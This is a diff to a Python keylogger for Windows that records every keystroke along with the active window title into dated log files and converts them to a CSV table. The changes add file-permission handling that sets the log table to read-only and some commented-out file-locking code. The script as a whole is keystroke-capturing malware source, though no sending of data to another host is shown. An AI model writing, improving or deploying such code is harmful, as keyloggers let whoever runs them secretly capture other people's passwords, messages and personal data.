@@ -11,9 +11,14 @@ import pandas as pd
 import win32gui
 import os
 import zipfile
+import  portalocker
+from stat import S_IREAD, S_IRGRP, S_IROTH
+
+
 
 
 from filelock import Timeout, FileLock
+from stat import S_IWUSR
 
 
 
@@ -24,35 +29,44 @@ from filelock import Timeout, FileLock
 global pathforlogs
 global pathforlogsbackup
 
-pathforlogs = os.path.join('LogFolders', 'logs')
+pathforlogs = os.path.join('LogFolders', 'logs')  # defined globally
 
 
 # converts the text file to a table with headers.
 
-
 def converttotable():
   datelogname = datetime.today().strftime('%m-%d-%Y')  # to be used for naming the log with the date in it.
 
-  if not os.path.exists(pathforlogs):
+  if not os.path.exists(pathforlogs):  # if folder for the logs does exist, then create it.
     os.makedirs(pathforlogs)
 
   locationofFileandNameForLogs = os.path.join(pathforlogs, datelogname + "-logfile.txt")
   locationofFileandNameForLogsTable = os.path.join(pathforlogs, datelogname + "-logfile.csv")
 
-
   try:
     f = open(locationofFileandNameForLogs, 'r')
+
   except FileNotFoundError:
     print("the file was not found. But keep going, it will be converted after  the text file created")
     return
 
   try:
+    os.chmod(locationofFileandNameForLogsTable, S_IWUSR | S_IREAD)  # this will set the table file to read and write.
+  except FileNotFoundError:
+    pass
+    print("Cannot find the table file.")
+    print("Most likely it has not been created yet, will continue to run the program")
+
+
+
+  try:
     df = pd.read_csv(f, sep='|', encoding="ISO-8859-1", names=["TimeStamp", "Current Window", "KeyStrokes"])
     df.to_csv(locationofFileandNameForLogsTable, index=None, )
-
   except PermissionError:
-    print("User has opened the table file, they still have it opened. Which means we cannot open it.  ")
-    print("They need to close the file or we cannot access it. ")
+    print("WARNING: Cannot access the table file. If you have it open, please close it")
+
+  os.chmod(locationofFileandNameForLogsTable, S_IREAD) # After we are done with the file, we set it to read only. Because, If the user opens it, then we wont be able to write to it.
+
 
 
 # this will open the file and make the first line start with the timestamp next to it.  Ensures it starts with a datetimestamp on the first line at start.
@@ -159,11 +173,15 @@ def OnKeyboardEvent(event):
   buffers += keylogs  # Whatever is keylogs equal to, Gets added to the buffers variable.
   NewLineIfWindowChanges()
 
+  locationofFileandNameForLogsTable = os.path.join(pathforlogs, datelogname + "-logfile.csv")
+
 
   logfile.write(buffers)  # writes the key pressed  to the file
 
   logfile.close()  # closes the file
   converttotable()
+  # f2 = open(locationofFileandNameForLogsTable, 'r')
+  # portalocker.lock(f2, portalocker.LOCK_SH | portalocker.LOCK_NB)
   return True
 
 
@@ -179,6 +197,11 @@ def main():
   pythoncom.PumpMessages()
 
   givenewline()
+  datelogname = datetime.today().strftime('%m-%d-%Y')
+
+  # locationofFileandNameForLogsTable = os.path.join(pathforlogs, datelogname + "-logfile.csv")
+  # f2 = open(locationofFileandNameForLogsTable)
+  # portalocker.lock(f2, portalocker.LOCK_SH | portalocker.LOCK_NB)
 
 
 if __name__ == "__main__":
